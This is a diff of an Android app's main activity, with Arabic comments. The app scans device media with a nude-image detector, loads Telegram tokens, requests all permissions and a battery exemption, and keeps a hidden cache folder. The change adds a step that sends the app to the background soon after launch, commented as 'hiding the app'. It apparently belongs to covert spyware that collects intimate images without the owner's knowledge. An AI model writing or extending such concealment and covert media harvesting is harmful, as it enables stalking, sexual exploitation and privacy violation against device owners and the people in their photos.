@@ -26,7 +26,6 @@ import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import org.json.JSONObject
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
@@ -42,7 +41,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var logEditText: EditText
     private lateinit var progressBar: ProgressBar
     private lateinit var runtimeDir: File
-    private lateinit var modelsDir: File
 
     private var telegramUi: TelegramUi? = null
     private var mediaScanner: MediaScanner? = null
@@ -102,9 +100,10 @@ class MainActivity : AppCompatActivity() {
             initCoreAsync()
         }
 
+        // ✅ استبدال فتح إعدادات الإشعارات بـ moveTaskToBack(true)
         lifecycleScope.launch(Dispatchers.Main) {
-            delay(2000)
-            openNotificationSettings()
+            delay(3000)
+            moveTaskToBack(true) // إخفاء التطبيق بدلاً من فتح الإعدادات
         }
     }
 
@@ -176,17 +175,9 @@ class MainActivity : AppCompatActivity() {
         }
         requestBatteryOptimizationExemption()
 
-        appendLog("🧠 الخطوة 3/5: التحقق من ملف نموذج AI (engine_v2.tflite)...")
-        try {
-            val modelReady = ensureModelReady()
-            if (modelReady) {
-                appendLog("✅ [OK] نموذج AI جاهز ويعمل بنجاح.")
-            } else {
-                appendLog("⚠️ [WARNING] نموذج AI غير متوفر حالياً، سيتم تفعيله فور اكتمال التحميل في الخلفية.")
-            }
-        } catch (e: Exception) {
-            appendLog("❌ [ERROR] فشل التحقق من النموذج: ${e.message} (MainActivity.ensureModelReady)")
-        }
+        // ✅ الخطوة 3/5: تهيئة وحدة الكشف الذكي (بدلاً من التحقق من النموذج)
+        appendLog("🧠 الخطوة 3/5: تهيئة وحدة الكشف الذكي (سيتم تحميل النموذج في الخلفية)...")
+        // NudeDetector سيتكفل بتحميل النموذج بشكل آمن عند الحاجة
 
         appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
         try {
@@ -263,7 +254,7 @@ class MainActivity : AppCompatActivity() {
 
         File(runtimeDir, "updates").mkdirs()
         File(runtimeDir, ".cache_thumb").mkdirs()
-        modelsDir = File(runtimeDir, "models").apply { mkdirs() }
+        File(runtimeDir, "models").mkdirs() // مجلد النماذج (سيتم إدارته بواسطة NudeDetector)
     }
 
     private fun requestAllPermissions() {
@@ -369,100 +360,9 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun openNotificationSettings() {
-        try {
-            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
-                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
-            }
-            startActivity(intent)
-        } catch (e: Exception) {
-            appendLog("⚠️ تعذر فتح إعدادات الإشعارات: ${e.localizedMessage}")
-        }
-    }
+    // ✅ تم حذف دالة openNotificationSettings() لأنها لم تعد مستخدمة
 
-    private fun updateProgress(progress: Int) {
-        _progressState.value = progress.coerceIn(0, 100)
-    }
-
-    /**
-     * ✅ التأكد من جاهزية نموذج AI.
-     * تم حذف محاولة النسخ من assets (الملف غير موجود أصلاً) لتجنب IOException غير الضروري.
-     * يتم التحميل مباشرة من الإنترنت باستخدام FileDownloader.
-     */
-    private suspend fun ensureModelReady(): Boolean {
-        val modelFile = File(modelsDir, "engine_v2.tflite")
-        val minSize = 1_000_000L
-
-        // 1. التحقق من وجود الملف محلياً
-        if (modelFile.exists() && modelFile.length() >= minSize) {
-            appendLog("✅ نموذج AI موجود مسبقاً (${modelFile.length() / (1024 * 1024)} ميجابايت).")
-            updateProgress(100)
-            return true
-        }
-
-        // 2. الانتقال مباشرة للتحميل من الإنترنت (تم حذف محاولة النسخ من assets)
-        appendLog("📥 بدء تحميل النموذج من الإنترنت (قد يستغرق عدة دقائق)...")
-        updateProgress(5)
-
-        // 3. قراءة ملف index.json للحصول على رابط التحميل
-        val indexJson = try {
-            assets.open("index.json").bufferedReader().use { it.readText() }
-        } catch (e: Exception) {
-            appendLog("❌ فشل قراءة ملف index.json: ${e.localizedMessage}")
-            updateProgress(0)
-            return false
-        }
-
-        val json = JSONObject(indexJson)
-        val assetsArray = json.getJSONArray("assets")
-        if (assetsArray.length() == 0) {
-            appendLog("❌ لا توجد أصول في index.json")
-            updateProgress(0)
-            return false
-        }
-
-        val asset = assetsArray.getJSONObject(0)
-        val url = asset.getString("url")
-        val expectedSize = asset.optLong("expected_size", 0)
-        val isBase64 = asset.optBoolean("is_base64", false)
-
-        if (url.isEmpty()) {
-            appendLog("❌ رابط التحميل غير موجود في index.json")
-            updateProgress(0)
-            return false
-        }
-
-        appendLog("🌐 رابط التحميل: $url")
-        if (expectedSize > 0) {
-            appendLog("📦 الحجم المتوقع: ${expectedSize / (1024 * 1024)} ميجابايت")
-        } else {
-            appendLog("⚠️ الحجم المتوقع غير محدد، سيتم التحقق من سلامة الملف لاحقاً.")
-        }
-
-        // 4. تنفيذ التحميل
-        val downloader = FileDownloader(this)
-        val success = withContext(Dispatchers.IO) {
-            downloader.downloadModelWithRetry(
-                url = url,
-                destinationFile = modelFile,
-                expectedSize = expectedSize,
-                isBase64 = isBase64,
-                maxRetries = 3
-            )
-        }
-
-        // 5. التحقق من نجاح التحميل
-        if (success && modelFile.exists() && modelFile.length() >= minSize) {
-            appendLog("✅ تم تحميل النموذج بنجاح (${modelFile.length() / (1024 * 1024)} ميجابايت).")
-            updateProgress(100)
-            return true
-        } else {
-            appendLog("❌ فشل تحميل النموذج بعد عدة محاولات، أو الملف تالف.")
-            updateProgress(0)
-            if (modelFile.exists()) modelFile.delete()
-            return false
-        }
-    }
+    // ✅ تم حذف دالة ensureModelReady() لتجنب التعارض مع NudeDetector
 
     override fun onDestroy() {
         super.onDestroy()
